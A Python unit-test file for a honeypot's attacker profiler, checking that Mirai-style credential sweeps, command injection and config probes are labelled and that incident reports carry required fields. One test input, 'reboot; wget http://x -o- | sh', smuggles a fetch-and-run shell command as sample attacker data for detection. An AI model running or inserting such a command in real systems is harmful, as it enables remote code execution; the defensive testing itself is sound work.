"""Attacker profiler: known patterns match, and the incident report has the required fields."""

import os
import sys
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "gateway"))
import profiler  # noqa: E402
import decoy as decoy_mod  # noqa: E402


def interactions(cmds, t0=1000.0):
    return [{"ts": t0 + i, "raw": c, "cmd": c} for i, c in enumerate(cmds)]


class Patterns(unittest.TestCase):
    def test_default_credential_sweep(self):
        label, conf = profiler.match_pattern(interactions(["login admin:admin", "login root:root"]))
        self.assertIn("Mirai", label)
        self.assertGreaterEqual(conf, 70)

    def test_command_injection(self):
        label, _ = profiler.match_pattern(interactions(["get /config", "reboot; wget http://x -o- | sh"]))
        self.assertIn("injection", label)

    def test_config_probe(self):
        label, _ = profiler.match_pattern(interactions(["get /config", "get /stream"]))
        self.assertIn("exfiltration", label)

    def test_unknown_pattern_still_flagged(self):
        label, conf = profiler.match_pattern(interactions(["hello", "foo"]))
        self.assertEqual(label, "unknown pattern")
        self.assertGreater(conf, 0)   # any decoy contact is hostile by design

    def test_no_interactions_is_zero_confidence(self):
        self.assertEqual(profiler.match_pattern([]), ("unknown pattern", 0))


class Profile(unittest.TestCase):
    def test_profile_has_required_fields(self):
        p = profiler.build_profile("10.42.0.9", interactions(["login admin:admin", "get /config"]))
        for field in ("ip", "geo_hint", "first_seen", "last_seen", "duration_s", "commands",
                      "distinct_cmds", "fingerprint", "matched_pattern", "confidence", "summary"):
            self.assertIn(field, p)
        self.assertEqual(p["ip"], "10.42.0.9")
        self.assertEqual(p["duration_s"], 1.0)
        self.assertEqual(len(p["fingerprint"]), 12)

    def test_fingerprint_is_stable_and_order_sensitive(self):
        a = profiler.build_profile("x", interactions(["login a", "get /config"]))["fingerprint"]
        b = profiler.build_profile("x", interactions(["login a", "get /config"]))["fingerprint"]
        c = profiler.build_profile("x", interactions(["get /config", "login a"]))["fingerprint"]
        self.assertEqual(a, b)
        self.assertNotEqual(a, c)


class Report(unittest.TestCase):
    def test_report_contains_required_sections(self):
        p = profiler.build_profile("10.42.0.9", interactions(["login admin:admin", "get /config"]))
        text = profiler.build_report(p, org_name="Test Org", cert_contact="soc@test")
        for needed in ("INCIDENT REPORT", "Test Org", "soc@test", "10.42.0.9", "SOURCE",
                       "BEHAVIOUR", "login admin:admin", "RECOMMENDED ACTION", "Observe-only"):
            self.assertIn(needed, text)

    def test_report_flags_source_not_person(self):
        text = profiler.build_report(profiler.build_profile("1.2.3.4", interactions(["login a"])))
        self.assertIn("not accused", text)


class DecoyParsing(unittest.TestCase):
    def test_parse_and_canned_reply(self):
        self.assertEqual(decoy_mod.parse_cmd(b"LOGIN admin:admin"), "login admin:admin")
        self.assertEqual(decoy_mod.parse_cmd(b"GET /config"), "get /config")
        self.assertTrue(decoy_mod.canned_reply("login admin:admin").startswith("OK"))
        self.assertIn("unknown", decoy_mod.canned_reply("zzz"))


if __name__ == "__main__":
    unittest.main()
